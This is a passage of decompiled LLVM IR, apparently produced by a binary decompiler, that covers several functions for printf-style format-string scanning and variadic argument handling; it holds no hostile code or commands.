  uselistorder i32 %v2_db50, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_db68, { 0, 1, 3, 2 }
  uselistorder i32 %v0_dc70, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_dd60, { 1, 0 }
  uselistorder i1 %v7_dcb0, { 1, 2, 0 }
  uselistorder i1 %v7_de9c, { 1, 0 }
  uselistorder i1 %v7_de14, { 1, 0 }
  uselistorder i1 %v7_dcf0, { 1, 0 }
  uselistorder i32 %v2_de4c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_de40, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_df44, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_dbf0, { 1, 3, 2, 0 }
  uselistorder i32 %v4_dbcc, { 1, 0 }
  uselistorder i32 %v2_da88, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 22, 23, 24, 26, 25, 3, 27, 28, 29, 30, 31, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 7, 9, 8, 12, 10, 11, 14, 13, 15, 17, 16, 1, 18, 19, 20, 21, 47, 22, 46, 23, 24, 3, 25, 2, 26, 45, 27, 4, 28, 44, 29, 30, 32, 33, 43, 31, 34, 35, 5, 40, 41, 36, 42, 37, 38, 6, 39, 0 }
  uselistorder i32 (i32, i8, i32)* @function_d9a8, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_12fb8, { 1, 0 }
  uselistorder i32 55804, { 1, 0 }
  uselistorder label %dec_label_pc_e138, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_e130, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_e0b8, { 1, 0 }
  uselistorder label %dec_label_pc_e048, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_dff4, { 1, 0 }
  uselistorder label %dec_label_pc_dfd8, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_dfd8thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_df00, { 1, 0 }
  uselistorder label %dec_label_pc_deb8, { 1, 0 }
  uselistorder label %dec_label_pc_ddcc, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_dca0, { 1, 0 }
  uselistorder label %dec_label_pc_dc9c, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_dbe8, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_db8c, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_db58, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_db3c.outer36, { 1, 0 }
}

define i32 @function_e168(i32* %arg1) local_unnamed_addr {
dec_label_pc_e168:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_e168 = load i32, i32* @r4, align 4
  %v6_e168 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_e174 = load i32, i32* @r1, align 4
  store i32 %v0_e174, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_e180 = bitcast i32* %arg1 to i8*
  %v3_e180 = call i32 @function_f240(i8* %v2_e180, i32 0)
  store i32 %v3_e180, i32* %r0.global-to-local, align 4
  %v0_e184 = load i32, i32* @r4, align 4
  %v1_e184 = add i32 %v0_e184, 24
  %v2_e184 = inttoptr i32 %v1_e184 to i32*
  %v3_e184 = load i32, i32* %v2_e184, align 4
  store i32 %v3_e184, i32* %r3.global-to-local, align 4
  %v0_e188 = load i32, i32* @r5, align 4
  %v2_e188 = inttoptr i32 %v0_e184 to i32*
  store i32 %v0_e188, i32* %v2_e188, align 4
  %v0_e18c = load i32, i32* %r3.global-to-local, align 4
  %v1_e18c = add i32 %v0_e18c, -1
  %v1_e190 = load i32, i32* @r4, align 4
  %v2_e190 = add i32 %v1_e190, 24
  %v3_e190 = inttoptr i32 %v2_e190 to i32*
  store i32 %v1_e18c, i32* %v3_e190, align 4
  %v0_e194 = load i32, i32* @r4, align 4
  %v1_e194 = add i32 %v0_e194, 40
  store i32 %v1_e194, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_e1a421 = inttoptr i32 %v1_e194 to i32*
  store i32 8, i32* %v2_e1a421, align 4
  %v3_e1a422 = load i32, i32* %r2.global-to-local, align 4
  %v4_e1a423 = add i32 %v3_e1a422, 4
  store i32 %v4_e1a423, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e1a0.dec_label_pc_e1a0_crit_edge

dec_label_pc_e1a0.dec_label_pc_e1a0_crit_edge:    ; preds = %dec_label_pc_e168, %dec_label_pc_e1a0.dec_label_pc_e1a0_crit_edge
  %v4_e1a424 = phi i32 [ %v4_e1a423, %dec_label_pc_e168 ], [ %v4_e1a4, %dec_label_pc_e1a0.dec_label_pc_e1a0_crit_edge ]
  %v0_e1a0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_e1a4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_e1a0 = add i32 %v0_e1a0.pre, -1
  store i32 %v1_e1a0, i32* %r3.global-to-local, align 4
  %v7_e1a0 = icmp eq i32 %v0_e1a0.pre, 1
  %v2_e1a4 = inttoptr i32 %v4_e1a424 to i32*
  store i32 %v0_e1a4.pre, i32* %v2_e1a4, align 4
  %v3_e1a4 = load i32, i32* %r2.global-to-local, align 4
  %v4_e1a4 = add i32 %v3_e1a4, 4
  store i32 %v4_e1a4, i32* %r2.global-to-local, align 4
  br i1 %v7_e1a0, label %dec_label_pc_e1ac, label %dec_label_pc_e1a0.dec_label_pc_e1a0_crit_edge

dec_label_pc_e1ac:                                ; preds = %dec_label_pc_e1a0.dec_label_pc_e1a0_crit_edge
  %v0_e1ac = load i32, i32* @r5, align 4
  store i32 %v0_e1ac, i32* %r2.global-to-local, align 4
  %v1_e1ec2 = inttoptr i32 %v0_e1ac to i8*
  %v2_e1ec3 = load i8, i8* %v1_e1ec2, align 1
  %v3_e1ec4 = zext i8 %v2_e1ec3 to i32
  store i32 %v3_e1ec4, i32* %r0.global-to-local, align 4
  %v2_e1f05 = icmp eq i8 %v2_e1ec3, 0
  br i1 %v2_e1f05, label %dec_label_pc_e1f8, label %dec_label_pc_e1b4

dec_label_pc_e1b4:                                ; preds = %dec_label_pc_e1ac, %dec_label_pc_e1ec.backedge
  %v0_e1bc = phi i32 [ %storemerge, %dec_label_pc_e1ec.backedge ], [ %v0_e1ac, %dec_label_pc_e1ac ]
  %v0_e1b4 = phi i32 [ %v3_e1ec, %dec_label_pc_e1ec.backedge ], [ %v3_e1ec4, %dec_label_pc_e1ac ]
  %v7_e1b4 = icmp eq i32 %v0_e1b4, 37
  br i1 %v7_e1b4, label %dec_label_pc_e1bc, label %dec_label_pc_e1e8

dec_label_pc_e1bc:                                ; preds = %dec_label_pc_e1b4
  %v1_e1bc = add i32 %v0_e1bc, 1
  %v2_e1bc = inttoptr i32 %v1_e1bc to i8*
  %v3_e1bc = load i8, i8* %v2_e1bc, align 1
  %v4_e1bc = zext i8 %v3_e1bc to i32
  store i32 %v4_e1bc, i32* %r3.global-to-local, align 4
  store i32 %v1_e1bc, i32* %r2.global-to-local, align 4
  %v7_e1c0 = icmp eq i8 %v3_e1bc, 37
  br i1 %v7_e1c0, label %dec_label_pc_e1e8, label %dec_label_pc_e1c8

dec_label_pc_e1c8:                                ; preds = %dec_label_pc_e1bc
  %v1_e1c8 = load i32, i32* @r4, align 4
  %v2_e1c8 = inttoptr i32 %v1_e1c8 to i32*
  store i32 %v1_e1bc, i32* %v2_e1c8, align 4
  %v0_e1cc = load i32, i32* @r4, align 4
  store i32 %v0_e1cc, i32* %r0.global-to-local, align 4
  %v1_e1d0 = inttoptr i32 %v0_e1cc to i8*
  %v2_e1d0 = call i32 @function_e450(i8* %v1_e1d0)
  store i32 %v2_e1d0, i32* %r0.global-to-local, align 4
  %v1_e1d4 = icmp slt i32 %v2_e1d0, 0
  br i1 %v1_e1d4, label %dec_label_pc_e1fc.loopexit, label %dec_label_pc_e1e0

dec_label_pc_e1e0:                                ; preds = %dec_label_pc_e1c8
  %v0_e1e0 = load i32, i32* @r4, align 4
  %v1_e1e0 = inttoptr i32 %v0_e1e0 to i32*
  %v2_e1e0 = load i32, i32* %v1_e1e0, align 4
  br label %dec_label_pc_e1ec.backedge

dec_label_pc_e1e8:                                ; preds = %dec_label_pc_e1b4, %dec_label_pc_e1bc
  %v0_e1e8 = phi i32 [ %v0_e1bc, %dec_label_pc_e1b4 ], [ %v1_e1bc, %dec_label_pc_e1bc ]
  %v1_e1e8 = add i32 %v0_e1e8, 1
  br label %dec_label_pc_e1ec.backedge

dec_label_pc_e1ec.backedge:                       ; preds = %dec_label_pc_e1e8, %dec_label_pc_e1e0
  %storemerge = phi i32 [ %v1_e1e8, %dec_label_pc_e1e8 ], [ %v2_e1e0, %dec_label_pc_e1e0 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_e1ec = inttoptr i32 %storemerge to i8*
  %v2_e1ec = load i8, i8* %v1_e1ec, align 1
  %v3_e1ec = zext i8 %v2_e1ec to i32
  store i32 %v3_e1ec, i32* %r0.global-to-local, align 4
  %v2_e1f0 = icmp eq i8 %v2_e1ec, 0
  br i1 %v2_e1f0, label %dec_label_pc_e1ec.dec_label_pc_e1f8_crit_edge, label %dec_label_pc_e1b4

dec_label_pc_e1ec.dec_label_pc_e1f8_crit_edge:    ; preds = %dec_label_pc_e1ec.backedge
  %v0_e1f8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_e1f8

dec_label_pc_e1f8:                                ; preds = %dec_label_pc_e1ec.dec_label_pc_e1f8_crit_edge, %dec_label_pc_e1ac
  %v0_e1f8 = phi i32 [ %v0_e1f8.pre, %dec_label_pc_e1ec.dec_label_pc_e1f8_crit_edge ], [ %v0_e1ac, %dec_label_pc_e1ac ]
  %v1_e1f8 = load i32, i32* @r4, align 4
  %v2_e1f8 = inttoptr i32 %v1_e1f8 to i32*
  store i32 %v0_e1f8, i32* %v2_e1f8, align 4
  %v1_e204.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e1fc

dec_label_pc_e1fc.loopexit:                       ; preds = %dec_label_pc_e1c8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e1fc

dec_label_pc_e1fc:                                ; preds = %dec_label_pc_e1fc.loopexit, %dec_label_pc_e1f8
  %v1_e204 = phi i32 [ -1, %dec_label_pc_e1fc.loopexit ], [ %v1_e204.pre, %dec_label_pc_e1f8 ]
  store i32 %v3_e168, i32* @r4, align 4
  store i32 %v6_e168, i32* @r5, align 4
  ret i32 %v1_e204

; uselistorder directives
  uselistorder i32 %v3_e1ec, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_e1ac, { 1, 0, 2, 3 }
  uselistorder i32 %v4_e1a4, { 1, 0 }
  uselistorder i32 %v0_e1a0.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 4, 1, 7, 3, 2, 0, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 5, 6, 3, 1, 7, 0 }
  uselistorder label %dec_label_pc_e1e8, { 1, 0 }
  uselistorder label %dec_label_pc_e1b4, { 1, 0 }
  uselistorder label %dec_label_pc_e1a0.dec_label_pc_e1a0_crit_edge, { 1, 0 }
}

define i32 @function_e208(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_e208:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_e208 = load i32, i32* @r4, align 4
  store i32 %v3_e208, i32* %stack_var_-12, align 4
  %v0_e20c = load i32, i32* @r0, align 4
  %v1_e20c = add i32 %v0_e20c, 24
  %v2_e20c = inttoptr i32 %v1_e20c to i32*
  %v3_e20c = load i32, i32* %v2_e20c, align 4
  store i32 %v3_e20c, i32* %r5.global-to-local, align 4
  store i32 %v0_e20c, i32* @r4, align 4
  %v2_e21c = add i32 %v0_e20c, 76
  %v3_e21c = inttoptr i32 %v2_e21c to i32*
  store i32 %arg2, i32* %v3_e21c, align 4
  %tmp5 = icmp slt i32 %v3_e20c, 1
  br i1 %tmp5, label %dec_label_pc_e240, label %dec_label_pc_e224

dec_label_pc_e224:                                ; preds = %dec_label_pc_e208
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_e228 = load i32, i32* @r0, align 4
  %v2_e228 = add i32 %v1_e228, 8
  %v3_e228 = inttoptr i32 %v2_e228 to i32*
  store i32 0, i32* %v3_e228, align 4
  %v0_e22c = load i32, i32* %r5.global-to-local, align 4
  %v1_e22c = load i32, i32* @r0, align 4
  %v2_e22c = add i32 %v1_e22c, 28
  %v3_e22c = inttoptr i32 %v2_e22c to i32*
  store i32 %v0_e22c, i32* %v3_e22c, align 4
  %v0_e230 = load i32, i32* %r3.global-to-local, align 4
  %v1_e230 = load i32, i32* @r0, align 4
  %v2_e230 = add i32 %v1_e230, 24
  %v3_e230 = inttoptr i32 %v2_e230 to i32*
  store i32 %v0_e230, i32* %v3_e230, align 4
  %v0_e234 = load i32, i32* %r3.global-to-local, align 4
  %v1_e234 = load i32, i32* @r0, align 4
  %v2_e234 = add i32 %v1_e234, 4
  %v3_e234 = inttoptr i32 %v2_e234 to i32*
  store i32 %v0_e234, i32* %v3_e234, align 4
  %v0_e238 = call i32 @function_e24c()
  store i32 %v0_e238, i32* @r0, align 4
  %v0_e23c = load i32, i32* %r5.global-to-local, align 4
  %v1_e23c = load i32, i32* @r4, align 4
  %v2_e23c = add i32 %v1_e23c, 24
  %v3_e23c = inttoptr i32 %v2_e23c to i32*
  store i32 %v0_e23c, i32* %v3_e23c, align 4
  br label %dec_label_pc_e240

dec_label_pc_e240:                                ; preds = %dec_label_pc_e208, %dec_label_pc_e224
  %v2_e244 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_e244, i32* @r4, align 4
  %v1_e248 = load i32, i32* @r0, align 4
  ret i32 %v1_e248

; uselistorder directives
  uselistorder i32 %v0_e20c, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_e24c, { 1, 0 }
  uselistorder label %dec_label_pc_e240, { 1, 0 }
}

define i32 @function_e24c() local_unnamed_addr {
dec_label_pc_e24c:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_e24c = load i32, i32* @r0, align 4
  %v1_e24c = add i32 %v0_e24c, 24
  %v2_e24c = inttoptr i32 %v1_e24c to i32*
  %v3_e24c = load i32, i32* %v2_e24c, align 4
  store i32 %v3_e24c, i32* %r1.global-to-local, align 4
  %v2_e250 = icmp eq i32 %v3_e24c, 0
  %v3_e254 = load i32, i32* @r4, align 4
  store i32 %v3_e254, i32* %stack_var_-8, align 4
  %v1_e258 = add i32 %v0_e24c, 8
  %v2_e258 = inttoptr i32 %v1_e258 to i32*
  %v3_e258 = load i32, i32* %v2_e258, align 4
  store i32 %v3_e258, i32* %r3.global-to-local, align 4
  %v6_e260 = icmp eq i32 %v3_e258, -2147483648
  br i1 %v2_e250, label %dec_label_pc_e260, label %dec_label_pc_e398

dec_label_pc_e260:                                ; preds = %dec_label_pc_e24c
  br i1 %v6_e260, label %dec_label_pc_e268, label %dec_label_pc_e280

dec_label_pc_e268:                                ; preds = %dec_label_pc_e260
  %v1_e268 = add i32 %v0_e24c, 76
  %v2_e268 = inttoptr i32 %v1_e268 to i32*
  %v3_e268 = load i32, i32* %v2_e268, align 4
  store i32 %v3_e268, i32* %r3.global-to-local, align 4
  %v1_e26c = inttoptr i32 %v3_e268 to i32*
  %v2_e26c = load i32, i32* %v1_e26c, align 4
  store i32 %v2_e26c, i32* %r2.global-to-local, align 4
  %v1_e270 = add i32 %v3_e268, 4
  store i32 %v1_e270, i32* %r3.global-to-local, align 4
  store i32 %v1_e270, i32* %v2_e268, align 4
  %v0_e278 = load i32, i32* %r2.global-to-local, align 4
  %v1_e278 = load i32, i32* @r0, align 4
  %v2_e278 = add i32 %v1_e278, 8
  %v3_e278 = inttoptr i32 %v2_e278 to i32*
  store i32 %v0_e278, i32* %v3_e278, align 4
  %v0_e27c = load i32, i32* %r2.global-to-local, align 4
  %v1_e27c = load i32, i32* @r0, align 4
  %v2_e27c = add i32 %v1_e27c, 80
  %v3_e27c = inttoptr i32 %v2_e27c to i32*
  store i32 %v0_e27c, i32* %v3_e27c, align 4
  %v0_e280.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e280

dec_label_pc_e280:                                ; preds = %dec_label_pc_e260, %dec_label_pc_e268
  %v1_e29c = phi i32 [ %v0_e24c, %dec_label_pc_e260 ], [ %v0_e280.pre, %dec_label_pc_e268 ]
  %v1_e280 = add i32 %v1_e29c, 4
  %v2_e280 = inttoptr i32 %v1_e280 to i32*
  %v3_e280 = load i32, i32* %v2_e280, align 4
  store i32 %v3_e280, i32* %r3.global-to-local, align 4
  %v6_e284 = icmp eq i32 %v3_e280, -2147483648
  %v1_e288 = add i32 %v1_e29c, 80
  store i32 %v1_e288, i32* %ip.global-to-local, align 4
  br i1 %v6_e284, label %dec_label_pc_e290, label %dec_label_pc_e2a8

dec_label_pc_e290:                                ; preds = %dec_label_pc_e280
  %v1_e290 = add i32 %v1_e29c, 76
  %v2_e290 = inttoptr i32 %v1_e290 to i32*
  %v3_e290 = load i32, i32* %v2_e290, align 4
  store i32 %v3_e290, i32* %r3.global-to-local, align 4
  %v1_e294 = inttoptr i32 %v3_e290 to i32*
  %v2_e294 = load i32, i32* %v1_e294, align 4
  store i32 %v2_e294, i32* %r2.global-to-local, align 4
  %v1_e298 = add i32 %v3_e290, 4
  store i32 %v1_e298, i32* %r3.global-to-local, align 4
  store i32 %v1_e298, i32* %v2_e290, align 4
  %v0_e2a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_e2a0 = load i32, i32* @r0, align 4
  %v2_e2a0 = add i32 %v1_e2a0, 4
  %v3_e2a0 = inttoptr i32 %v2_e2a0 to i32*
  store i32 %v0_e2a0, i32* %v3_e2a0, align 4
  %v0_e2a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_e2a4 = load i32, i32* @r0, align 4
  %v2_e2a4 = add i32 %v1_e2a4, 80
  %v3_e2a4 = inttoptr i32 %v2_e2a4 to i32*
  store i32 %v0_e2a4, i32* %v3_e2a4, align 4
  %v0_e38817.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e2a8

dec_label_pc_e2a8:                                ; preds = %dec_label_pc_e280, %dec_label_pc_e290
  %v0_e38817 = phi i32 [ %v1_e29c, %dec_label_pc_e280 ], [ %v0_e38817.pre, %dec_label_pc_e290 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_e2ac = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_e2ac, i32* %lr.global-to-local, align 4
  %v1_e38818 = add i32 %v0_e38817, 28
  %v2_e38819 = inttoptr i32 %v1_e38818 to i32*
  %v3_e38820 = load i32, i32* %v2_e38819, align 4
  store i32 %v3_e38820, i32* %r3.global-to-local, align 4
  %v5_e39022 = icmp slt i32 %v0_e2ac, %v3_e38820
  br i1 %v5_e39022, label %dec_label_pc_e2b4, label %dec_label_pc_e394.loopexit

dec_label_pc_e2b4:                                ; preds = %dec_label_pc_e2a8, %dec_label_pc_e388.backedge
  %v0_e38824 = phi i32 [ %v0_e388, %dec_label_pc_e388.backedge ], [ %v0_e38817, %dec_label_pc_e2a8 ]
  %v0_e2c023 = phi i32 [ %v0_e2c0.be, %dec_label_pc_e388.backedge ], [ %v0_e2ac, %dec_label_pc_e2a8 ]
  %v4_e2b4 = mul i32 %v0_e2c023, 4
  %v5_e2b4 = add i32 %v4_e2b4, %v0_e38824
  store i32 %v5_e2b4, i32* %r3.global-to-local, align 4
  %v1_e2b8 = add i32 %v5_e2b4, 40
  %v2_e2b8 = inttoptr i32 %v1_e2b8 to i32*
  %v3_e2b8 = load i32, i32* %v2_e2b8, align 4
  store i32 %v3_e2b8, i32* %r3.global-to-local, align 4
  %v7_e2bc = icmp eq i32 %v3_e2b8, 8
  %v1_e2c0 = add i32 %v0_e2c023, 1
  store i32 %v1_e2c0, i32* %lr.global-to-local, align 4
  br i1 %v7_e2bc, label %dec_label_pc_e388.backedge, label %dec_label_pc_e2c8

dec_label_pc_e2c8:                                ; preds = %dec_label_pc_e2b4
  %v1_e2c8 = add i32 %v0_e38824, 76
  %v2_e2c8 = inttoptr i32 %v1_e2c8 to i32*
  %v3_e2c8 = load i32, i32* %v2_e2c8, align 4
  store i32 %v3_e2c8, i32* %r1.global-to-local, align 4
  %v8_e2cc = icmp sgt i32 %v3_e2b8, 8
  br i1 %v8_e2cc, label %dec_label_pc_e2f0, label %dec_label_pc_e2d0

dec_label_pc_e2d0:                                ; preds = %dec_label_pc_e2c8
  %v7_e2d0 = icmp eq i32 %v3_e2b8, 2
  br i1 %v7_e2d0, label %dec_label_pc_e340, label %dec_label_pc_e2d8

dec_label_pc_e2d8:                                ; preds = %dec_label_pc_e2d0
  %v8_e2d8 = icmp sgt i32 %v3_e2b8, 2
  br i1 %v8_e2d8, label %dec_label_pc_e2e8, label %dec_label_pc_e2dc

dec_label_pc_e2dc:                                ; preds = %dec_label_pc_e2d8
  %v1_e2dc = icmp slt i32 %v3_e2b8, 0
  br i1 %v1_e2dc, label %dec_label_pc_e374, label %dec_label_pc_e340

dec_label_pc_e2e8:                                ; preds = %dec_label_pc_e2d8
  %v7_e2e8 = icmp eq i32 %v3_e2b8, 7
  br i1 %v7_e2e8, label %dec_label_pc_e354, label %dec_label_pc_e374

dec_label_pc_e2f0:                                ; preds = %dec_label_pc_e2c8
  %v7_e2f0 = icmp eq i32 %v3_e2b8, 1024
  br i1 %v7_e2f0, label %dec_label_pc_e340, label %dec_label_pc_e2f8

dec_label_pc_e2f8:                                ; preds = %dec_label_pc_e2f0
  %v8_e2f8 = icmp sgt i32 %v3_e2b8, 1024
  br i1 %v8_e2f8, label %dec_label_pc_e310, label %dec_label_pc_e2fc

dec_label_pc_e2fc:                                ; preds = %dec_label_pc_e2f8
  switch i32 %v3_e2b8, label %dec_label_pc_e374 [
    i32 256, label %dec_label_pc_e340
    i32 512, label %dec_label_pc_e340
  ]

dec_label_pc_e310:                                ; preds = %dec_label_pc_e2f8
  %v7_e310 = icmp eq i32 %v3_e2b8, 2048
  br i1 %v7_e310, label %dec_label_pc_e324, label %dec_label_pc_e31c

dec_label_pc_e31c:                                ; preds = %dec_label_pc_e310
  %v1_e318 = load i32, i32* %r4.global-to-local, align 4
  %v9_e318 = icmp eq i32 %v3_e2b8, %v1_e318
  br i1 %v9_e318, label %dec_label_pc_e354, label %dec_label_pc_e374

dec_label_pc_e324:                                ; preds = %dec_label_pc_e310
  %v1_e324 = add i32 %v3_e2c8, 7
  %v1_e328 = and i32 %v1_e324, -8
  store i32 %v1_e328, i32* %r3.global-to-local, align 4
  %v1_e32c = inttoptr i32 %v1_e328 to i32*
  %v2_e32c = load i32, i32* %v1_e32c, align 8
  store i32 %v2_e32c, i32* %r1.global-to-local, align 4
  %v3_e32c = or i32 %v1_e328, 4
  %v4_e32c = inttoptr i32 %v3_e32c to i32*
  %v5_e32c = load i32, i32* %v4_e32c, align 4
  store i32 %v5_e32c, i32* %r2.global-to-local, align 4
  %v1_e330 = add i32 %v1_e328, 8
  store i32 %v1_e330, i32* %r3.global-to-local, align 4
  store i32 %v1_e330, i32* %v2_e2c8, align 4
  %v0_e338 = load i32, i32* %ip.global-to-local, align 4
  %v1_e338 = inttoptr i32 %v0_e338 to i32*
  %v2_e338 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_e338, i32* %v1_e338, align 4
  %v3_e338 = add i32 %v0_e338, 4
  %v4_e338 = inttoptr i32 %v3_e338 to i32*
  %v5_e338 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_e338, i32* %v4_e338, align 4
  br label %dec_label_pc_e384

dec_label_pc_e340:                                ; preds = %dec_label_pc_e2fc, %dec_label_pc_e2fc, %dec_label_pc_e2dc, %dec_label_pc_e2f0, %dec_label_pc_e2d0
  %v1_e340 = inttoptr i32 %v3_e2c8 to i32*
  %v2_e340 = load i32, i32* %v1_e340, align 4
  store i32 %v2_e340, i32* %r2.global-to-local, align 4
  %v1_e344 = add i32 %v3_e2c8, 4
  store i32 %v1_e344, i32* %r3.global-to-local, align 4
  store i32 %v1_e344, i32* %v2_e2c8, align 4
  %v0_e34c = load i32, i32* %r2.global-to-local, align 4
  %v1_e34c = load i32, i32* %ip.global-to-local, align 4
  %v2_e34c = inttoptr i32 %v1_e34c to i32*
  store i32 %v0_e34c, i32* %v2_e34c, align 4
  br label %dec_label_pc_e384

dec_label_pc_e354:                                ; preds = %dec_label_pc_e2e8, %dec_label_pc_e31c
  %v3_e354 = load i32, i32* %v2_e2c8, align 4
  %v1_e358 = add i32 %v3_e354, 7
  %v1_e35c = and i32 %v1_e358, -8
  store i32 %v1_e35c, i32* %r3.global-to-local, align 4
  %v1_e360 = inttoptr i32 %v1_e35c to i32*
  %v2_e360 = load i32, i32* %v1_e360, align 8
  store i32 %v2_e360, i32* %r1.global-to-local, align 4
  %v3_e360 = or i32 %v1_e35c, 4
  %v4_e360 = inttoptr i32 %v3_e360 to i32*
  %v5_e360 = load i32, i32* %v4_e360, align 4
  store i32 %v5_e360, i32* %r2.global-to-local, align 4
  %v1_e364 = add i32 %v1_e35c, 8
  store i32 %v1_e364, i32* %r3.global-to-local, align 4
  store i32 %v1_e364, i32* %v2_e2c8, align 4
  %v0_e36c = load i32, i32* %ip.global-to-local, align 4
  %v1_e36c = inttoptr i32 %v0_e36c to i32*
  %v2_e36c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_e36c, i32* %v1_e36c, align 4
  %v3_e36c = add i32 %v0_e36c, 4
  %v4_e36c = inttoptr i32 %v3_e36c to i32*
  %v5_e36c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_e36c, i32* %v4_e36c, align 4
  br label %dec_label_pc_e384

dec_label_pc_e374:                                ; preds = %dec_label_pc_e2fc, %dec_label_pc_e2e8, %dec_label_pc_e2dc, %dec_label_pc_e31c
  %v1_e374 = add i32 %v3_e2c8, 4
  store i32 %v1_e374, i32* %r3.global-to-local, align 4
  store i32 %v1_e374, i32* %v2_e2c8, align 4
  %v0_e37c = load i32, i32* %r1.global-to-local, align 4
  %v1_e37c = inttoptr i32 %v0_e37c to i32*
  %v2_e37c = load i32, i32* %v1_e37c, align 4
  store i32 %v2_e37c, i32* %r3.global-to-local, align 4
  %v1_e380 = load i32, i32* %ip.global-to-local, align 4
  %v2_e380 = inttoptr i32 %v1_e380 to i32*
  store i32 %v2_e37c, i32* %v2_e380, align 4
  br label %dec_label_pc_e384

dec_label_pc_e384:                                ; preds = %dec_label_pc_e354, %dec_label_pc_e340, %dec_label_pc_e324, %dec_label_pc_e374
  %v0_e384 = load i32, i32* %ip.global-to-local, align 4
  %v1_e384 = add i32 %v0_e384, 8
  store i32 %v1_e384, i32* %ip.global-to-local, align 4
  %v0_e38c.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_e388.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_e388.backedge

dec_label_pc_e388.backedge:                       ; preds = %dec_label_pc_e384, %dec_label_pc_e2b4
  %v0_e388 = phi i32 [ %v0_e388.pre, %dec_label_pc_e384 ], [ %v0_e38824, %dec_label_pc_e2b4 ]
  %v0_e2c0.be = phi i32 [ %v0_e38c.pre.pre, %dec_label_pc_e384 ], [ %v1_e2c0, %dec_label_pc_e2b4 ]
  %v1_e388 = add i32 %v0_e388, 28
  %v2_e388 = inttoptr i32 %v1_e388 to i32*
  %v3_e388 = load i32, i32* %v2_e388, align 4
  store i32 %v3_e388, i32* %r3.global-to-local, align 4
